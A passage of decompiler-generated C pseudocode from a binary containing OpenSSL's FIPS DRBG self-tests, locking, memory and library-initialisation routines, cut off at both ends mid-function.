            goto lab_0x43e785;
        } else {
            // 0x43ea07
            *v34 = *v34 | 1;
            v37 = 517;
            if ((int32_t)FIPS_drbg_instantiate(a1, (int64_t *)*v39, *v40) < 1) {
                // 0x43eab6
                *v34 = *v34 & -2;
                v11 = 524;
                v14 = v33;
                if ((int32_t)FIPS_drbg_uninstantiate(v35) == 0) {
                    goto lab_0x43e945;
                } else {
                    goto lab_0x43ead0;
                }
            } else {
                goto lab_0x43ea36;
            }
        }
    }
  lab_0x43ead0:
    // 0x43ead0
    v7 = v38;
    v12 = v33;
    if ((int32_t)do_drbg_instantiate(a1, a2) == 0) {
        goto lab_0x43e785;
    } else {
        int64_t * v45 = (int64_t *)(a2 + 136); // 0x43eae6
        int64_t * v46 = (int64_t *)(a2 + 72); // 0x43eaed
        int64_t v47 = *v46; // 0x43eaed
        int64_t * v48 = (int64_t *)(a2 + 64); // 0x43eaf3
        int64_t v49 = &v18; // 0x43eaf7
        int64_t v50 = FIPS_drbg_generate(v35, v49, *v45, 0, *v48, v47); // 0x43eafd
        v7 = 0;
        v12 = v47;
        if ((int32_t)v50 == 0) {
            goto lab_0x43e785;
        } else {
            // 0x43eb0a
            *v34 = *v34 | 1;
            int64_t v51 = *(int64_t *)(a1 + 32); // 0x43eb0e
            int64_t v52 = *v46; // 0x43eb14
            if ((int32_t)FIPS_drbg_generate(v35, v49, v51 + 1, 0, *v48, v52) == 0) {
                int64_t v53 = *(int64_t *)(a1 + 80) + 1; // 0x43eb6c
                if ((int32_t)FIPS_drbg_generate(v35, v49, *v45, 0, *v48, v53) != 0) {
                    // 0x43ecba
                    ERR_put_error(45, 136, 150, "fips_drbg_selftest.c", 553);
                    v7 = (int64_t)"fips_drbg_selftest.c";
                    v12 = v53;
                    goto lab_0x43e785;
                } else {
                    int64_t v54 = *v46; // 0x43eb9c
                    int64_t v55 = FIPS_drbg_generate(v35, v49, *v45, 1, *v48, v54); // 0x43eba6
                    v10 = 566;
                    v13 = v54;
                    if ((int32_t)v55 != 0) {
                        goto lab_0x43e873;
                    } else {
                        // 0x43ebb9
                        *v34 = *v34 & -2;
                        v11 = 573;
                        v14 = v54;
                        if ((int32_t)FIPS_drbg_uninstantiate(v35) == 0) {
                            goto lab_0x43e945;
                        } else {
                            // 0x43ebd3
                            v7 = 1;
                            v12 = v54;
                            if ((int32_t)do_drbg_instantiate(a1, a2) != 0) {
                                int64_t v56 = *v46; // 0x43ebf5
                                *(int32_t *)(a1 + 88) = *(int32_t *)(a1 + 92);
                                int64_t v57 = FIPS_drbg_generate(v35, v49, *v45, 0, *v48, v56); // 0x43ec12
                                v7 = 0;
                                v12 = v56;
                                if ((int32_t)v57 != 0) {
                                    // 0x43eda1
                                    ERR_put_error(45, 136, 105, "fips_drbg_selftest.c", 595);
                                    v7 = (int64_t)"fips_drbg_selftest.c";
                                    v12 = v56;
                                }
                            }
                            goto lab_0x43e785;
                        }
                    }
                }
            } else {
                // 0x43eb2f
                ERR_put_error(45, 136, 130, "fips_drbg_selftest.c", 545);
                v7 = (int64_t)"fips_drbg_selftest.c";
                v12 = v52;
                goto lab_0x43e785;
            }
        }
    }
  lab_0x43ea36:
    // 0x43ea36
    ERR_put_error(45, 136, 149, "fips_drbg_selftest.c", v37);
    v7 = (int64_t)"fips_drbg_selftest.c";
    v12 = v33;
    goto lab_0x43e785;
}

// Address range: 0x43efa0 - 0x43f00a
int64_t fips_drbg_kat(int64_t a1, int32_t a2, int32_t a3) {
    // 0x43efa0
    if (g177 == 0) {
        // 0x43eff0
        return 0;
    }
    int64_t v1 = (int64_t)&g176;
    int64_t v2; // 0x43efa0
    int64_t v3; // 0x43efa0
    int64_t v4; // 0x43efa0
    if (g177 == a2) {
        // 0x43efd2
        if (*(int32_t *)(v1 + 8) == (a3 || 2)) {
            // 0x43efd7
            if ((int32_t)fips_drbg_single_kat(a1, v1, 0, v4, v3, v2) != 0) {
                // 0x43eff9
                return fips_drbg_error_check(a1, v1, 0, v4);
            }
            return 0;
        }
    }
    int32_t v5 = *(int32_t *)(v1 + 308); // 0x43efc7
    int64_t v6 = v1 + 304; // 0x43efcc
    while (v5 != 0) {
        // 0x43efce
        v1 = v6;
        if (v5 == a2) {
            // 0x43efd2
            if (*(int32_t *)(v1 + 8) == (a3 || 2)) {
                // 0x43efd7
                if ((int32_t)fips_drbg_single_kat(a1, v1, 0, v4, v3, v2) != 0) {
                    // 0x43eff9
                    return fips_drbg_error_check(a1, v1, 0, v4);
                }
                return 0;
            }
        }
        // 0x43efc0
        v5 = *(int32_t *)(v1 + 308);
        v6 = v1 + 304;
    }
    // 0x43eff0
    return 0;
}

// Address range: 0x43f010 - 0x43f081
int64_t FIPS_drbg_health_check(int64_t a1, int64_t a2) {
    int64_t v1 = FIPS_drbg_new(0, 0); // 0x43f02d
    if (v1 == 0) {
        // 0x43f05f
        return 0;
    }
    // 0x43f03a
    int64_t v2; // 0x43f010
    int64_t v3 = fips_drbg_kat(v1, (int32_t)v2, *(int32_t *)(a1 + 4)); // 0x43f043
    FIPS_drbg_free(v1);
    if ((int32_t)v3 == 0) {
        // 0x43f078
        *(int32_t *)(a1 + 104) = 3;
    } else {
        // 0x43f058
        *(int32_t *)(a1 + 12) = 0;
    }
    // 0x43f05f
    return v3 & 0xffffffff;
}

// Address range: 0x43f0e0 - 0x43f0e8
int64_t FIPS_rand_get_method(void) {
    // 0x43f0e0
    return g252;
}

// Address range: 0x43f430 - 0x43f4bc
int64_t FIPS_rand_set_method(int64_t a1) {
    // 0x43f430
    if (g250 != 0) {
        // 0x43f440
        g252 = a1;
        return 1;
    }
    // 0x43f450
    if (FIPS_drbg_method() == a1) {
        // 0x43f4b0
        g251 = 1;
        // 0x43f440
        g252 = a1;
        return 1;
    }
    // 0x43f45a
    if (FIPS_x931_method() == a1) {
        // 0x43f4a0
        g251 = 2;
        // 0x43f440
        g252 = a1;
        return 1;
    }
    // 0x43f464
    g251 = 0;
    if ((int32_t)FIPS_module_mode() == 0) {
        // 0x43f440
        g252 = a1;
        return 1;
    }
    // 0x43f477
    ERR_put_error(45, 126, 100, "fips_rand_lib.c", 85);
    return 0;
}

// Address range: 0x43f590 - 0x43f595
int64_t CRYPTO_THREADID_hash(int64_t a1) {
    // 0x43f590
    return *(int64_t *)(a1 + 8);
}

// Address range: 0x43f620 - 0x43f667
int64_t OPENSSL_showfatal(char * a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6) {
    // 0x43f620
    int64_t v1; // 0x43f620
    return 0x43f687 - (4 * v1 & 1020);
}

// Address range: 0x43f6d0 - 0x43f6ef
int64_t OpenSSLDie(char * a1, int64_t a2, char * a3) {
    // 0x43f6d0
    int64_t v1; // 0x43f6d0
    int64_t v2; // 0x43f6d0
    OPENSSL_showfatal("%s(%d): OpenSSL internal error, assertion failed: %s\n", (int64_t)a1, a2 & 0xffffffff, (int64_t)a3, v2, v1);
    abort();
    // UNREACHABLE
}

// Address range: 0x43f890 - 0x43f89f
int64_t CRYPTO_THREADID_cpy(int64_t * a1, int64_t * a2) {
    int64_t v1 = (int64_t)a2;
    *a1 = v1;
    int64_t result = *(int64_t *)(v1 + 8); // 0x43f896
    *(int64_t *)((int64_t)a1 + 8) = result;
    return result;
}

// Address range: 0x43f8a0 - 0x43f8bc
int64_t CRYPTO_THREADID_cmp(int64_t * a1, int64_t * a2, int64_t a3) {
    // 0x43f8a0
    bool v1; // 0x43f8a0
    int64_t v2 = v1 ? -1 : 1; // 0x43f8ae
    int64_t v3 = (int64_t)a2; // 0x43f8a0
    int64_t v4 = (int64_t)a1; // 0x43f8a0
    int64_t v5 = 16; // 0x43f8ae
    unsigned char v6 = *(char *)v4; // 0x43f8ae
    char v7 = *(char *)v3; // 0x43f8ae
    char v8 = v7; // 0x43f8ae
    bool v9 = false; // 0x43f8ae
    while (v6 == v7) {
        v5--;
        v3 += v2;
        v4 += v2;
        v8 = v6;
        v9 = true;
        if (v5 == 0) {
            // break ->
            break;
        }
        v6 = *(char *)v4;
        v7 = *(char *)v3;
        v8 = v7;
        v9 = false;
    }
    unsigned char v10 = v8;
    return (int64_t)!((v6 < v10 | v9)) - (int64_t)(v6 < v10);
}

// Address range: 0x43f8c0 - 0x43f8c8
int64_t CRYPTO_THREADID_set_pointer(int64_t a1, int64_t a2) {
    // 0x43f8c0
    *(int64_t *)a1 = a2;
    *(int64_t *)(a1 + 8) = a2;
    int64_t result; // 0x43f8c0
    return result;
}

// Address range: 0x43f8d0 - 0x43f8dc
int64_t CRYPTO_THREADID_set_numeric(int64_t a1, int64_t a2) {
    // 0x43f8d0
    *(int64_t *)a1 = 0;
    *(int64_t *)(a1 + 8) = a2;
    int64_t result; // 0x43f8d0
    return result;
}

// Address range: 0x43f8e0 - 0x43f943
int64_t CRYPTO_THREADID_current(int64_t a1) {
    // 0x43f8e0
    if (g257 != 0) {
        // 0x43f8f0
        return g257;
    }
    // 0x43f900
    if (g256 != 0) {
        // 0x43f90c
        return CRYPTO_THREADID_set_numeric(a1, g256);
    }
    // 0x43f928
    return CRYPTO_THREADID_set_pointer(a1, (int64_t)__errno_location());
}

// Address range: 0x43f970 - 0x43fa6f
int64_t CRYPTO_destroy_dynlockid(int64_t a1) {
    int64_t result = a1 & 0xffffffff ^ 0xffffffff; // 0x43f973
    if (g258 == 0) {
        // 0x43fa10
        return result;
    }
    // 0x43f98f
    int64_t v1; // 0x43f970
    int64_t v2; // 0x43f970
    CRYPTO_lock(9, 29, "cryptlib.c", 305, v2, v1);
    if (g259 == 0) {
        // 0x43f9c4
        return CRYPTO_lock(10, 29, "cryptlib.c", 309, (int64_t)&g299, (int64_t)&g299);
    }
    uint64_t v3 = ((int32_t)a1 != 0 ? result : a1) & 0xffffffff; // 0x43f97e
    if (v3 >= sk_num(g259)) {
        // 0x43f9c4
        return CRYPTO_lock(10, 29, "cryptlib.c", 309, (int64_t)&g299, (int64_t)&g299);
    }
    int64_t v4 = sk_value(g259, v3); // 0x43f9e9
    if (v4 == 0) {
        // 0x43f9c4
        return CRYPTO_lock(10, 29, "cryptlib.c", 331, (int64_t)&g299, (int64_t)&g299);
    }
    int32_t * v5 = (int32_t *)v4; // 0x43f9f6
    int32_t v6 = *v5 - 1; // 0x43f9f8
    *v5 = v6;
    if (v6 >= 1) {
        // 0x43f9c4
        return CRYPTO_lock(10, 29, "cryptlib.c", 331, (int64_t)&g299, (int64_t)&g299);
    }
    // 0x43fa20
    sk_set(g259, v3, 0);
    CRYPTO_lock(10, 29, "cryptlib.c", 331, (int64_t)&g299, (int64_t)&g299);
    return CRYPTO_free(v4, (int64_t)"cryptlib.c");
}

// Address range: 0x43fa70 - 0x43fb37
int64_t CRYPTO_lock(int64_t a1, int64_t a2, char * a3, int64_t a4, int64_t a5, int64_t a6) {
    if ((uint32_t)(int32_t)a2 >= 0) {
        // 0x43fa9a
        return g255;
    }
    // 0x43fab0
    if (g254 == 0) {
        // 0x43fa9a
        int64_t result; // 0x43fa70
        return result;
    }
    int64_t v1 = a2 & 0xffffffff; // 0x43fa7a
    if (CRYPTO_get_dynlock_value(v1) != 0) {
        // 0x43facc
        return CRYPTO_destroy_dynlockid(v1);
    }
    // 0x43fb10
    OpenSSLDie("cryptlib.c", 595, "pointer != NULL");
    // UNREACHABLE
}

// Address range: 0x43fb40 - 0x43fbe2
int64_t CRYPTO_add_lock(int64_t a1, int64_t a2, int64_t a3, char * a4, int64_t a5) {
    // 0x43fb40
    if (g253 != 0) {
        // 0x43fb6f
        int64_t result; // 0x43fb40
        return result;
    }
    int64_t v1 = a3 & 0xffffffff; // 0x43fb4a
    int64_t v2 = a5 & 0xffffffff; // 0x43fb90
    CRYPTO_lock(9, v1, a4, v2, 0x100000000 * a5 / 0x100000000, (int64_t)&g299);
    int64_t v3; // 0x43fb40
    uint32_t result2 = (int32_t)v3 + (int32_t)a2; // 0x43fba7
    *(int32_t *)a1 = result2;
    CRYPTO_lock(10, v1, a4, v2, (int64_t)&g299, (int64_t)&g299);
    return result2;
}

// Address range: 0x43fbf0 - 0x43fc8a
int64_t CRYPTO_get_dynlock_value(int64_t a1) {
    // 0x43fbf0
    int64_t v1; // 0x43fbf0
    CRYPTO_lock(9, 29, "cryptlib.c", 346, v1, (int64_t)&g299);
    if (g259 == 0) {
        // 0x43fc2c
        CRYPTO_lock(10, 29, "cryptlib.c", 353, (int64_t)&g299, (int64_t)&g299);
        return 0;
    }
    uint64_t v2 = ((int32_t)a1 != 0 ? a1 ^ 0xffffffff : a1) & 0xffffffff; // 0x43fc0f
    if (v2 >= sk_num(g259)) {
        // 0x43fc2c
        CRYPTO_lock(10, 29, "cryptlib.c", 353, (int64_t)&g299, (int64_t)&g299);
        return 0;
    }
    int64_t v3 = sk_value(g259, v2); // 0x43fc59
    if (v3 == 0) {
        // 0x43fc2c
        CRYPTO_lock(10, 29, "cryptlib.c", 353, (int64_t)&g299, (int64_t)&g299);
        return 0;
    }
    int32_t * v4 = (int32_t *)v3; // 0x43fc66
    *v4 = *v4 + 1;
    CRYPTO_lock(10, 29, "cryptlib.c", 353, (int64_t)&g299, (int64_t)&g299);
    return *(int64_t *)(v3 + 8);
}

// Address range: 0x4402c0 - 0x4402fa
int64_t CRYPTO_free_locked(int64_t a1, int64_t a2) {
    // 0x4402c0
    free((int64_t *)a1);
    return g260;
}

// Address range: 0x440300 - 0x44039c
int64_t CRYPTO_malloc(int64_t a1, char * a2, int64_t a3, int64_t a4, int64_t a5) {
    int32_t size = a1; // 0x440315
    if (size < 1) {
        // 0x440388
        return 0;
    }
    // 0x440321
    g178 = 0;
    if (g261 != 0) {
        // 0x440337
        g179 = 0;
    }
    // 0x440388
    return (int64_t)malloc(size);
}

// Address range: 0x4403a0 - 0x440478
int64_t CRYPTO_realloc(int64_t a1, int64_t a2, char * a3, int64_t a4, int64_t a5, int64_t a6) {
    if (a1 == 0) {
        // 0x440450
        return CRYPTO_malloc(a2 & 0xffffffff, a3, a4 & 0xffffffff, a4, a5);
    }
    uint32_t v1 = (int32_t)a2; // 0x4403d4
    int64_t mem = 0; // 0x4403d6
    if (v1 >= 1) {
        // 0x4403d8
        mem = (int64_t)realloc((int64_t *)a1, v1);
    }
    // 0x44042a
    return mem;
}

// Address range: 0x440480 - 0x4404ba
int64_t CRYPTO_free(int64_t a1, int64_t a2) {
    // 0x440480
    free((int64_t *)a1);
    return g260;
}

// Address range: 0x440530 - 0x44064e
int64_t CRYPTO_realloc_clean(int64_t a1, int64_t a2, int64_t a3, char * a4, int64_t a5, int64_t a6) {
    if (a1 == 0) {
        // 0x440598
        return CRYPTO_malloc(a3 & 0xffffffff, a4, a5 & 0xffffffff, (int64_t)a4, a5);
    }
    int32_t size = a3; // 0x440565
    if (a3 < a2 || size >= 0 != size != 0) {
        // 0x44056c
        return 0;
    }
    int64_t * mem = malloc(size); // 0x4405f0
    if (mem != NULL) {
        int64_t v1 = 0x100000000 * a2 / 0x100000000; // 0x4405fe
        int64_t * v2 = (int64_t *)a1; // 0x44060a
        memcpy(mem, v2, (int32_t)v1);
        OPENSSL_cleanse(a1, v1);
        free(v2);
    }
    // 0x44056c
    return (int64_t)mem;
}

// Address range: 0x440df0 - 0x440fb1
int64_t CRYPTO_mem_ctrl(int64_t a1) {
    uint32_t result = g262; // 0x440e0e
    int64_t v1; // 0x440df0
    int64_t v2; // 0x440df0
    CRYPTO_lock(9, 20, "mem_dbg.c", 220, v2, v1);
    uint32_t v3 = (int32_t)a1; // 0x440e19
    if (v3 == 1) {
        // 0x440f50
        g262 = 3;
        g263 = 0;
        // 0x440e37
        CRYPTO_lock(10, 20, "mem_dbg.c", 282, (int64_t)&g299, (int64_t)&g299);
        return result;
    }
    if (v3 <= 1) {
        if (v3 == 0) {
            // 0x440f78
            g262 = 0;
            g263 = 0;
        }
        // 0x440e37
        CRYPTO_lock(10, 20, "mem_dbg.c", 282, (int64_t)&g299, (int64_t)&g299);
        return result;
    }
    int64_t v4; // bp-40, 0x440df0
    switch (v3) {
        case 2: {
            // 0x440e60
            if (g262 % 2 == 0 || g263 == 0) {
                // 0x440e37
                CRYPTO_lock(10, 20, "mem_dbg.c", 282, (int64_t)&g299, (int64_t)&g299);
                return result;
            }
            int32_t v5 = g263 - 1; // 0x440e74
            g263 = v5;
            if (v5 == 0) {
                // 0x440e81
                g262 |= 2;
                CRYPTO_lock(10, 27, "mem_dbg.c", 273, (int64_t)&g299, (int64_t)&g299);
            }
            // 0x440e37
            CRYPTO_lock(10, 20, "mem_dbg.c", 282, (int64_t)&g299, (int64_t)&g299);
            return result;
        }
        case 3: {
            // 0x440eb0
            if (*(char *)&g262 % 2 == 0) {
                // 0x440e37
                CRYPTO_lock(10, 20, "mem_dbg.c", 282, (int64_t)&g299, (int64_t)&g299);
                return result;
            }
            // 0x440ebd
            CRYPTO_THREADID_current((int64_t)&v4);
            if (g263 != 0) {
                int64_t v6 = CRYPTO_THREADID_cmp(&g265, &v4, (int64_t)"mem_dbg.c"); // 0x440fa2
                if ((int32_t)v6 == 0) {
                    // 0x440f3a
                    g263 = &g264;
                    // 0x440e37
                    CRYPTO_lock(10, 20, "mem_dbg.c", 282, (int64_t)&g299, (int64_t)&g299);
                    return result;
                }
            }
            // break -> 0x440ed3
            break;
        }
        default: {
            // 0x440e37
            CRYPTO_lock(10, 20, "mem_dbg.c", 282, (int64_t)&g299, (int64_t)&g299);
            return result;
        }
    }
    // 0x440ed3
    CRYPTO_lock(10, 20, "mem_dbg.c", 250, (int64_t)&g299, (int64_t)&g299);
    CRYPTO_lock(9, 27, "mem_dbg.c", 256, (int64_t)&g299, (int64_t)&g299);
    CRYPTO_lock(9, 20, "mem_dbg.c", 257, (int64_t)&g299, (int64_t)&g299);
    g262 &= -3;
    CRYPTO_THREADID_cpy(&g265, &v4);
    // 0x440f3a
    g263 = &g264;
    // 0x440e37
    CRYPTO_lock(10, 20, "mem_dbg.c", 282, (int64_t)&g299, (int64_t)&g299);
    return result;
}

// Address range: 0x441770 - 0x4417d0
int64_t impl_check(void) {
    // 0x441770
    CRYPTO_lock(9, 2, "ex_data.c", 203, (int64_t)&g299, (int64_t)&g299);
    if (g266 == 0) {
        // 0x4417c0
        g266 = &g180;
    }
    // 0x441799
    return CRYPTO_lock(10, 2, "ex_data.c", 206, (int64_t)&g299, (int64_t)&g299);
}

// Address range: 0x4417d0 - 0x441822
int64_t CRYPTO_free_ex_data(int32_t a1, int64_t a2, int64_t a3) {
    // 0x4417d0
    if (g266 != 0) {
        // 0x4417e0
        return *(int64_t *)(g266 + 40);
    }
    // 0x4417f0
    impl_check();
    return *(int64_t *)(g266 + 40);
}

// Address range: 0x441890 - 0x4418e2
int64_t CRYPTO_new_ex_data(int32_t a1, int64_t a2, int64_t a3) {
    // 0x441890
    if (g266 != 0) {
        // 0x4418a0
        return *(int64_t *)(g266 + 24);
    }
    // 0x4418b0
    impl_check();
    return *(int64_t *)(g266 + 24);
}

// Address range: 0x442410 - 0x442422
int64_t FIPS_mode(void) {
    // 0x442410
    OPENSSL_init();
    return FIPS_module_mode();
}

// Address range: 0x442430 - 0x44248c
int64_t FIPS_mode_set(int64_t a1) {
    // 0x442430
    OPENSSL_init();
    if ((int32_t)a1 != 0) {
        // 0x44243c
        if ((int32_t)FIPS_module_mode() != 0) {
            // 0x442472
            return 1;
        }
    }
    // 0x44244c
    if ((int32_t)FIPS_module_mode_set(a1 & 0xffffffff) == 0) {
        // 0x442472
        return 0;
    }
    if ((int32_t)a1 != 0) {
        // 0x442478
        RAND_set_rand_method((int32_t)FIPS_rand_get_method());
        return 1;
    }
    // 0x442466
    RAND_set_rand_method(0);
    // 0x442472
    return 1;
}

// Address range: 0x442490 - 0x442842
int64_t OPENSSL_init_library(void) {
    uint32_t result = g267; // 0x44249e
    if (result != 0) {
        // 0x4424a8
        return result;
    }
    // 0x4424b7
    g267 = 1;
    char * lineptr = NULL; // bp-80, 0x4424cf
    int64_t n = 0; // bp-88, 0x4424d8
    struct _IO_FILE * file = fopen("/etc/pki/tls/legacy-settings", "r"); // 0x4424e6
    int64_t v1 = (int64_t)"r"; // 0x4424f6
    int64_t v2 = (int64_t)"/etc/pki/tls/legacy-settings"; // 0x4424f6
    char * v3; // 0x442490
    int64_t v4; // 0x442490
    int64_t v5; // 0x442490
    int64_t v6; // 0x442490
    char * str2; // 0x442490
    int64_t v7; // 0x442490
    int64_t v8; // 0x44272e
    int16_t ** v9; // 0x442517
    if (file != NULL) {
        // 0x442500
        if (getline(&lineptr, (int32_t *)&n, file) >= 1) {
            while (true) {
              lab_0x442517:
                // 0x442517
                v9 = __ctype_b_loc();
                int64_t v10 = (int64_t)*v9; // 0x442524
                int64_t v11 = v10 + 1; // 0x44253b
                int64_t v12 = (int64_t)lineptr;
                str2 = (char *)v12;
                char v13 = *str2; // 0x442534
                int64_t v14 = v12 + 1; // 0x442540
                while ((*(char *)(2 * (int64_t)v13 + v11) & 32) != 0) {
                    // 0x442534
                    v12 = v14;
                    str2 = (char *)v12;
                    v13 = *str2;
                    v14 = v12 + 1;
                }
                int64_t v15 = v12; // 0x442547
                v3 = str2;
                v6 = v10;
                v4 = v12;
                if (v13 != 0) {
                    int64_t v16 = v15;
                    int64_t v17 = v16 + 1; // 0x44255f
                    char * v18 = (char *)v17;
                    unsigned char v19 = *v18; // 0x442563
                    v3 = v18;
                    v6 = v10;
                    v4 = v17;
                    while (v19 != 0) {
                        char v20 = *(char *)(0x100000000000000 * (int64_t)v19 / 0x80000000000000 + v11); // 0x442554
                        v15 = v17;
                        if ((v20 & 32) != 0) {
                            // 0x442720
                            *v18 = 0;
                            int64_t v21 = v16 + 2; // 0x442723
                            v7 = (int64_t)*v9;
                            char * v22 = (char *)v21;
                            v8 = v7 + 1;
                            v3 = v22;
                            v6 = v7;
                            v4 = v21;
                            v5 = v21;
                            if ((*(char *)(2 * (int64_t)*v22 + v8) & 32) == 0) {
                                goto lab_0x44256a;
                            } else {
                                goto lab_0x442740;
                            }
                        }
                        v16 = v15;
                        v17 = v16 + 1;
                        v18 = (char *)v17;
                        v19 = *v18;
                        v3 = v18;
                        v6 = v10;
                        v4 = v17;
                    }
                }
                goto lab_0x44256a;
            }
        }
      lab_0x44278c:
        // 0x44278c
        fclose(file);
        v1 = &n;
        v2 = (int64_t)file;
    }
    int64_t result2 = FIPS_module_installed(v2, v1); // 0x442794
    if ((int32_t)result2 == 0) {
        // 0x4424a8
        return result2;
    }
    // 0x4427a1
    RAND_init_fips();
    int32_t buf = 48; // bp-72, 0x4427b2
    FIPS_mode_set(1);
    if (__secure_getenv("OPENSSL_FORCE_FIPS_MODE") == NULL) {
        int32_t fd = open("/proc/sys/crypto/fips_enabled", O_RDONLY); // 0x4427fb
        if (fd < 0) {
            // 0x442839
            FIPS_mode_set(0);
            goto lab_0x4427d7;
        } else {
            while (read(fd, (int64_t *)&buf, 2) < 0) {
                // 0x44280d
                if (*__errno_location() != 4) {
                    // break -> 0x442832
                    break;
                }
            }
            // 0x442832
            close(fd);
            if ((char)buf == 49) {
                // 0x4427d2
                FIPS_selftest_check();
                goto lab_0x4427d7;
            } else {
                // 0x442839
                FIPS_mode_set(0);
                goto lab_0x4427d7;
            }
        }
    } else {
        // 0x4427cd
        buf = 49;
        // 0x4427d2
        FIPS_selftest_check();
        goto lab_0x4427d7;
    }
  lab_0x44256a:;
    uint64_t v23 = v4;
    char * str = v3;
    uint64_t v24 = v23 + (int64_t)strlen(str); // 0x442576
    if (v23 < v24) {
        int64_t v25 = v24 - 1; // 0x442583
        char v26 = *(char *)(v6 + 1 + 2 * (int64_t)*(char *)v25); // 0x44258c
        if ((v26 & 32) != 0) {
            uint64_t v27 = v25;
            *(char *)v27 = 0;
            while (v23 < v27) {
                int64_t v28 = v27 - 1; // 0x442598
                char v29 = *(char *)v28; // 0x44259f
                if ((*(char *)((int64_t)*v9 + 1 + 2 * (int64_t)v29) & 32) == 0) {
                    // break -> 0x4425b2
                    break;
                }
                v27 = v28;
                *(char *)v27 = 0;
            }
        }
    }
    // 0x4425b2
    if (strcasecmp(str2, "LegacySigningMDs") == 0) {
        char v30 = *str; // 0x44267b
        if (v30 != 0) {
            int64_t v31 = (int64_t)*v9;
            char v32 = v30; // 0x442490
            char * v33 = str; // 0x442490
            int64_t v34 = v23; // 0x442490
            int32_t v35 = 0;
            while (true) {
                int32_t v36 = v35;
                char * str3 = v33;
                char v37 = v32; // 0x442689
                int64_t v38 = v34;
                char v39 = *(char *)(v31 + 1 + 0x100000000000000 * (int64_t)v37 / 0x80000000000000); // 0x4426a4
                int64_t v40; // 0x442490
                while (v37 != 44 && (v39 & 32) == 0) {
                    int64_t v41 = v38 + 1; // 0x442694
                    v37 = *(char *)v41;
                    v40 = v41;
                    if (v37 == 0) {
                        goto lab_0x442628;
                    }
                    v38 = v41;
                    v39 = *(char *)(v31 + 1 + 0x100000000000000 * (int64_t)v37 / 0x80000000000000);
                }
                // 0x442620
                *(char *)v38 = 0;
                v40 = v38 + 1;
              lab_0x442628:;
                int64_t v42 = v40;
                int32_t v43; // 0x442490
                if (strcasecmp(str3, "md5") != 0) {
                    // 0x4426c0
                    if (strcasecmp(str3, "md4") != 0) {
                        // 0x4426f0
                        if (strcasecmp(str3, "sha") != 0) {
                            // 0x442758
                            v43 = v36;
                            if (strcasecmp(str3, "md2") == 0) {
                                // 0x44276f
                                *(int32_t *)(4 * (int64_t)v36 + (int64_t)g170) = 3;
                                v43 = v36 + 1;
                            }
                        } else {
                            // 0x442703
                            *(int32_t *)(4 * (int64_t)v36 + (int64_t)g170) = 41;
                            v43 = v36 + 1;
                        }
                    } else {
                        // 0x4426d3
                        *(int32_t *)(4 * (int64_t)v36 + (int64_t)g170) = 257;
                        v43 = v36 + 1;
                    }
                } else {
                    // 0x44263f
                    *(int32_t *)(4 * (int64_t)v36 + (int64_t)g170) = 4;
                    v43 = v36 + 1;
                }
                // 0x442657
                v35 = v43;
                if (v35 >= 9) {
                    // break -> 0x442500
                    break;
                }
                // 0x442662
                v31 = (int64_t)*v9;
                int64_t v44 = v42; // 0x442662
                int64_t v45; // 0x442490
                char * v46; // 0x442490
                unsigned char v47; // 0x442665
                while (true) {
                    // 0x442665
                    v45 = v44;
                    v46 = (char *)v45;
                    v47 = *v46;
                    if (v47 != 44) {
                        char v48 = *(char *)(v31 + 1 + 0x100000000000000 * (int64_t)v47 / 0x80000000000000); // 0x442671
                        if ((v48 & 32) == 0) {
                            // break -> 0x44267b
                            break;
                        }
                    }
                    // 0x4426b0
                    v44 = v45 + 1;
                }
                // 0x44267b
                v32 = v47;
                v33 = v46;
                v34 = v45;
                if (v47 == 0) {
                    // break -> 0x442500
                    break;
                }
            }
        }
    } else {
        // 0x4425d4
        if (strcasecmp(lineptr, "MinimumDHBits") == 0) {
            int32_t str_as_l = strtol(str, NULL, 10); // 0x4425f7
            *g164 = str_as_l < 0x2711 ? str_as_l : 0;
        }
    }
    // 0x442500
    if (getline(&lineptr, (int32_t *)&n, file) < 1) {
        // break -> 0x44278c
        goto lab_0x44278c;
    }
    goto lab_0x442517;
  lab_0x4427d7:;
    int64_t v49 = FIPS_mode(); // 0x4427d7
    int64_t result3 = v49; // 0x4427de
    if ((int32_t)v49 == 0) {
        // 0x4427e4
        result3 = RAND_set_rand_method(0);
    }
    // 0x4424a8
    return result3;
  lab_0x442740:;
    int64_t v50 = v5 + 1; // 0x442740
    char * v51 = (char *)v50;
    v3 = v51;
    v6 = v7;
    v4 = v50;
    v5 = v50;
    if ((*(char *)(2 * (int64_t)*v51 + v8) & 32) != 0) {
        goto lab_0x442740;
    } else {
        goto lab_0x44256a;
    }
}

// Address range: 0x442850 - 0x442855
int64_t OPENSSL_init(void) {
    // 0x442850
    return OPENSSL_init_library();
}

// Address range: 0x442a00 - 0x442a51
int64_t OPENSSL_cleanse(int64_t a1, int64_t a2) {
    int64_t v1; // 0x442a00
    int64_t v2; // 0x442a00
    if ((uint64_t)a2 >= 15) {
        int64_t v3 = a2; // 0x442a27
        int64_t v4 = a1; // 0x442a27
        if (a1 % 8 != 0) {
            *(char *)a1 = 0;
            int64_t v5 = a1 + 1; // 0x442a2f
            int64_t v6 = v5; // 0x442a27
            while (v5 % 8 != 0) {
                // 0x442a29
                *(char *)v6 = 0;
                v5 = v6 + 1;
                v6 = v5;
            }
            // 0x442a20
            v3 = (a1 | -8) + a2;
            v4 = v5;
        }
        // 0x442a35
        *(int64_t *)v4 = 0;
        int64_t v7 = v3 - 8; // 0x442a38
        int64_t v8 = v4 + 8; // 0x442a43
        int64_t v9 = v7; // 0x442a47
        int64_t v10 = v8; // 0x442a47
        while (v7 >= 8) {
            // 0x442a35
            *(int64_t *)v10 = 0;
            v7 = v9 - 8;
            v8 = v10 + 8;
            v9 = v7;
            v10 = v8;
        }
        // 0x442a49
        v2 = v7;
        v1 = v8;
        if (v7 == 0) {
            // 0x442a1b
            return 0;
        }
    } else {
        // 0x442a09
        v2 = a2;
        v1 = a1;
        if (a2 == 0) {
            // 0x442a1b
            return 0;
        }
    }
    int64_t v11 = v2; // 0x442a11
    int64_t v12 = v1; // 0x442a00
    *(char *)v12 = 0;
    v11--;
    v12++;
    while (v11 != 0) {
        // 0x442a0f
        *(char *)v12 = 0;
        v11--;
        v12++;
    }
    // 0x442a1b
    return 0;
}

// Address range: 0x442b40 - 0x442c6f
int64_t OBJ_bsearch_ex_(int64_t a1, int64_t result2, int64_t a3, int64_t a4, int64_t a5, uint32_t a6) {
    int32_t v1 = a3; // 0x442b5c
    if (v1 == 0) {
        // 0x442bcb
        return 0;
    }
    int64_t v2 = 0; // 0x442b6b
    int64_t v3 = 0; // 0x442b6b
    int64_t v4; // 0x442b99
    if (v1 > 0) {
        uint64_t v5 = 0;
